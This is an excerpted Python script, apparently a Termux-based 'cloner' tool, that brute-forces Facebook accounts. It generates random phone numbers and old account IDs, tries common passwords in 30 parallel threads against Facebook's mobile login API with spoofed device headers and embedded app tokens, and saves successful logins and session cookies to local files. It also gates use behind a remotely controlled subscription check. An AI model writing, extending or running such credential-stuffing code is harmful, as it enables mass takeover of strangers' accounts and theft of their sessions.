...
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           ...
           system('clear');print(Panel('SYSTEM MODIFICATION NOT ALLOWED SINCE USING SEX-F'));exit()
...
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.sex-f_fuckmotherkey-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.sex-f_fuckmotherkey-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.sex-f_fuckmotherkey-cov', 'r').read()
...
myweb2 = requests.get("https://github.com/SCAMMUR-CYBER/CONTOL/blob/main/SEX.txt").text
def apv():
	try:
		clear()
		x = requests.get("https://github.com/SCAMMUR-CYBER/CONTOL/blob/main/SEX.txt").text
		if str("upppdate") in update:
			os.system('clear')
			exit('SCRIPT IS IN UPDATED/MAINTANANCE BE PATIENT')
			...
			clear();print(Panel(f"[bold magenta]USERNAME : {username}"))
			print(Panel(f"[bold violet]YOUR TOKEN : {kex}"))
			print(Panel(f"[bold blue]YOUR SUBSCRIPTION DATE EXPIRED"))
			print(Panel(f"[bold yellow]CLONING DATE : [bold green]{date}"))
			print(Panel(f"[bold cyan]CONTACT DEVELOPER TO GET SUBSCRIPTION"))
...
""",title="[bold yellow]CHECKPOINT/DEAD ACC FIXER [bold cyan]V[bold red][u]4[/u]",subtitle=f"[bold green]SIM : {ahydra}",border_style=f"{border_color()}"))
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ CLEAR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def clear():
        ...
        try:
                        ...
                        if bryyy in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(Panel(f'IF NO RESULT ON/OFF AIRPLAN MODE'))
                                        for user in fo:
                                ...
                                print(Panel(f'TOTAL OK : {len(oks)}/CP : {len(cps)}'))
...
def api1(ids,names,passlist):
    ...
    sys.stdout.write('\r\033[1;37m[SEX-M1]-\033[1;37m[%s]-\033[1;37m[\033[1;32mOK:-%s\033[1;37m]-[\033[1;31mCP:-%s\033[1;37m] \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                statusok = f'UID : {ids} | PASS : {pas}'
                statusok1 = Panel(statusok,style='bold green')
                print(Panel(statusok1,title='SEX LIVE'))
                open('/sdcard/SEX-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print('\n')
                statuscp = f'UID : {ids} | PASS : {pas}'
                statuscp1 = Panel(statuscp,style='bold red')
                print(Panel(statuscp1,title='SEX CP'))
                open('/sdcard/SEX-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def ph():
    user=[]
    clear()
    code = input(f"SIM CODE : +63923,+63927,+63928,+63922,+63924\nCode Number : ")
    limit = int(input(f"EXAMPLE : 10000,20000,30000,99999 \nLimit Number : "))
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=8)))
    with tred(max_workers=30) as crack_submit:
        clear();tl = str(len(user))      
        print(Panel(f"SIM CODE : {code}"))
        print(Panel(f'LIMIT    : {tl}'))
        print(Panel(f"IF NO RESULT ON/OFF AIRPLANE MODE"))
        for psx in user:
            ids = code+psx
    ...
    print(Panel(f'THE PROCESS HAS COMPLETED'));print(Panel(f"TOTAL OK : {len(oks)}/CP : {len(cps)}"));exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RANDOM METHOD ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\033[1;37m[SEX-RANDOM]-\033[1;37m[%s]-\033[1;37m[\033[1;32mOK:-%s\033[1;37m]-[\033[1;31mCP:-%s\033[1;37m] \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\n')
                                        statusok = f'UID : {str(uid)} | PASS : {pas}'
                                        statusok1 = Panel(statusok,style='bold green')
                                        print(Panel(statusok1,title='SEX LIVE'))
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/SEX-RNDM-COOKIE.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/SEX-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\n')
                                        statuscp = f'UID : {str(uid)} | PASS : {pas}'
                                        statuscp1 = Panel(statuscp,style='bold red')
                                        print(Panel(statuscp1,title='SEX CP'))
                                        open('/sdcard/SEX-RND-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
class OLD_CLONER:
    ...
    def main(self):
        self.banner()
        print(Panel(f'[1] CRACK 2009'))
        print(Panel(f'[2] CRACK 2010'))
        print(Panel(f'[3] CRACK 2008'))
        print(Panel(f'[4] CRACK 2007'))
        print(Panel(f'[5] CRACK 2006'))
        print(Panel(f'[6] CRACK 2005'))
        print(Panel(f'[7] CRACK 2004'))
        select = input(f'\033[1;36mChoose Number: \033[1;33m')
    ...
    def oldClone(self,series):
        ...
        self.banner()
        print(Panel("[bold yellow][[bold cyan]1[bold yellow]][bold green] METHOD 1\n[bold yellow][[bold cyan]2[bold yellow]][bold green] METHOD 2",border_style=f"{border_color()}"))
        mthd = input(f'\033[1;36mMethod Number: \033[1;33m')
        for a in range(limit):
            ART = "".join(random.choice(string.digits) for _ in range(self.uG))
            self.gen.append(ART)
        with tred(max_workers=30) as crack_submit:
            self.banner()
            print(Panel(f"TOTAL OLD IDS : {len(self.gen)}"))
            for love in self.gen:
                ids = self.uX + love
                passlist = ["123456","1234567","12345678","123456789","123123","112233","1234567890"]
                if mthd in ['1','01']:
                    crack_submit.submit(self.CloneOld1,ids,passlist)
                if mthd in ['2','02']:
                    crack_submit.submit(self.CloneOld2,ids,passlist)
        print(Panel('THE PROCESS HAS COMPLETED'))
        print(Panel(f"TOTAL OK : {len(oks)}/CP : {len(cps)}"))
        input('PRESS ENTER TO BACK ')
        menu()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD METHOD 1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
    def CloneOld1(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\033[1;37m[SEX-OLD]-\033[1;37m[%s]-\033[1;37m[\033[1;32mOK:-%s\033[1;37m]-[\033[1;31mCP:-%s\033[1;37m] \033[1;37m'%(self.loop,len(self.oks),len(self.cps)));sys.stdout.flush()
        try:
            for pas in passlist:
                ...
                if "session_key" in response:
                    ...
                    statusok = f'UID : {ids} | PASS : {pas}'
                    statusok1 = Panel(statusok,style='bold green')
                    print(Panel(statusok1,title='SEX OK'))
                    open("/sdcard/SEXALIVE-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                    ...
                    statusok1 = Panel(statusok,style='bold green')
                    print(Panel(statusok1,title='SEX OK'))
                    open("/sdcard/SEX-EMAIL-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                else:continue
            self.loop +=1
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD METHOD 2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
    def CloneOld2(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\033[1;37m[SEX-OLD]-\033[1;37m[%s]-\033[1;37m[\033[1;32mOK:-%s\033[1;37m]-[\033[1;31mCP:-%s\033[1;37m] \033[1;37m'%(self.loop,len(self.oks),len(self.cps)));sys.stdout.flush()
        try:
            for pas in passlist:
                data = {'adid':str(uuid.uuid4()),'email':ids,'password':pas,'cpl':'true','credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled','format':'json','generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',"family_device_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"locale":"en_US","client_country_code":"US","device_id": str(uuid.uuid4()),"method": "auth.login","api_key": "882a8490361da98702bf97a021ddc14d","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                head = {'content-type':'application/x-www-form-urlencoded','Host': 'b-graph.facebook.com','x-fb-sim-hni':str(random.randint(20000,40000)),'X-FB-Connection-Type': 'MOBILE.LTE','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent': windows(),'x-fb-net-hni':str(random.randint(20000,40000)),'x-fb-device-group': '5120','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),'x-fb-connection-quality':'EXCELLENT','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','x-fb-friendly-name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','accept-encoding':'gzip, deflate','x-fb-http-engine':'Liger'}
                url = "https://b-graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head,verify=True).json()
                if "session_key" in response:
                    print('\n')
